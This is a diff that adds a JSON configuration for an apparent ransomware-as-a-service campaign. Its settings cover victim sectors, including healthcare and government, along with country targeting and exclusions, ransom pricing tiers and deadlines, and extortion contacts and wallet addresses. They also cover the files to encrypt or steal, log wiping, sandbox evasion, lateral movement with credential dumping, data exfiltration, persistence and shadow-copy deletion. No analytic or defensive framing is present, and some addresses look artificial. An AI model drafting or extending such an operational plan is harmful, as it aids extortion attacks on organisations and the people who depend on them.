@@ -1,0 +1,174 @@
+{
+  "operational_mode": "production",
+  "campaign_id": "CORPORATE_HUNTER_2024_Q2",
+  "affiliate_id": "AFF_7843_PREMIUM",
+  "version": "3.2.1",
+  "build_date": "2024-06-15T10:30:00Z",
+  
+  "encryption_settings": {
+    "master_key": "7f9a8b2c4d5e6f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a",
+    "key_rotation": true,
+    "key_rotation_interval": 24,
+    "algorithm": "xchacha20poly1305",
+    "key_derivation": "argon2id",
+    "use_hardware_rng": true
+  },
+  
+  "target_profile": {
+    "victim_types": ["enterprise", "government", "healthcare", "education", "financial"],
+    "minimum_value_assessment": 50000,
+    "preferred_countries": ["US", "GB", "DE", "FR", "CA", "AU", "JP", "CH", "NL", "SE"],
+    "excluded_countries": ["RU", "BY", "KZ", "UZ", "KG", "TJ", "AM", "AZ", "GE", "MD"],
+    "language_targeting": ["en-US", "en-GB", "de-DE", "fr-FR", "ja-JP", "ko-KR"]
+  },
+  
+  "contact_information": {
+    "primary_email": "datarecovery2024@protonmail.com",
+    "backup_emails": [
+      "filesupport@tutanota.com", 
+      "helpdesk@secmail.pro",
+      "recovery@cock.li"
+    ],
+    "telegram": "@DataRecoverySupport2024",
+    "onion_support": "http://helpdesk7x2xb4k3pzq2n0yrf2493p83kkfjhx0wlh.onion",
+    "bitcoin_addresses": {
+      "primary": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
+      "enterprise": "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2",
+      "government": "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy"
+    },
+    "monero_addresses": {
+      "primary": "47vL7pLqNMoB2CRjCJDmwqHstXd6wXEEK7JY4gJZSZYgKfpgBPvHFZzJBWGPWZ8eaXRyJ5SQJ6Y5Qy8eY9aXRJ8F"
+    }
+  },
+  
+  "payment_structure": {
+    "base_amount_btc": "0.5",
+    "pricing_tiers": {
+      "individual": "0.08",
+      "small_business": "0.5",
+      "medium_business": "2.5", 
+      "large_enterprise": "10.0",
+      "government": "25.0",
+      "healthcare": "15.0",
+      "critical_infrastructure": "50.0"
+    },
+    "early_payment_discount": 0.75,
+    "late_payment_penalty": 2.0,
+    "deadline_hours": 72,
+    "grace_period_hours": 24,
+    "price_increase_interval": 48
+  },
+  
+  "ransom_note_templates": {
+    "languages": ["en", "de", "fr", "es", "it", "ru", "zh", "ja", "ko", "pt"],
+    "personalization": true,
+    "company_name_extraction": true,
+    "file_count_display": true,
+    "payment_calculator": true,
+    "proof_files": 3,
+    "countdown_timer": true
+  },
+  
+  "file_targeting": {
+    "high_priority_extensions": [
+      ".xlsx", ".docx", ".pdf", ".ppt", ".sql", ".db", ".backup"
+    ],
+    "cryptocurrency_files": [
+      "wallet.dat", "*.wallet", "electrum.dat", "*.keys", "*.key"
+    ],
+    "credentials_files": [
+      "*password*", "*credential*", "*login*", "*.kdbx", "*.1pif"
+    ],
+    "development_files": [
+      "*.git", "*.svn", "*.env", "config.*", "*.pem", "*.p12"
+    ],
+    "size_limits": {
+      "minimum": 1024,
+      "maximum": 10737418240,
+      "prioritize_large": true
+    },
+    "skip_extensions": [
+      ".exe", ".dll", ".sys", ".drv", ".tmp", ".log", ".lnk"
+    ]
+  },
+  
+  "operational_security": {
+    "tor_routing": true,
+    "vpn_chaining": true,
+    "traffic_obfuscation": true,
+    "log_encryption": true,
+    "evidence_destruction": {
+      "clear_event_logs": true,
+      "overwrite_free_space": true,
+      "timestomp_files": true,
+      "clear_browser_data": true,
+      "registry_cleanup": true
+    }
+  },
+  
+  "anti_analysis": {
+    "vm_detection": true,
+    "sandbox_evasion": true,
+    "debugger_detection": true,
+    "analyst_environment_checks": true,
+    "geofencing": true,
+    "time_bombing": false,
+    "code_obfuscation": "maximum",
+    "packing": "multilayer"
+  },
+  
+  "lateral_movement": {
+    "enabled": true,
+    "network_discovery": true,
+    "credential_dumping": true,
+    "privilege_escalation": true,
+    "remote_execution_methods": ["psexec", "wmi", "powershell", "ssh"],
+    "share_enumeration": true,
+    "admin_share_mounting": true,
+    "max_spread_targets": 100,
+    "infection_delay": 300
+  },
+  
+  "data_exfiltration": {
+    "enabled": true,
+    "priority_data": [
+      "financial_records", "customer_data", "intellectual_property",
+      "credentials", "source_code", "certificates", "emails"
+    ],
+    "compression": true,
+    "encryption": true,
+    "staging_directory": "%TEMP%\\cache",
+    "chunk_size": 10485760,
+    "upload_throttling": true,
+    "steganography": false
+  },
+  
+  "persistence_mechanisms": {
+    "registry_modification": true,
+    "service_installation": true,
+    "scheduled_tasks": true,
+    "startup_programs": true,
+    "wmi_events": true,
+    "dll_hijacking": true,
+    "com_hijacking": true,
+    "bootkit": false
+  },
+  
+  "system_damage": {
+    "shadow_copy_deletion": true,
+    "system_restore_disabling": true,
+    "recovery_environment_modification": true,
+    "boot_record_modification": false,
+    "critical_service_disruption": false
+  },
+  
+  "statistics_tracking": {
+    "victim_count": true,
+    "files_encrypted": true,
+    "data_exfiltrated": true,
+    "payment_received": true,
+    "decryption_requests": true,
+    "geographical_spread": true,
+    "infection_vectors": true
+  }
+}
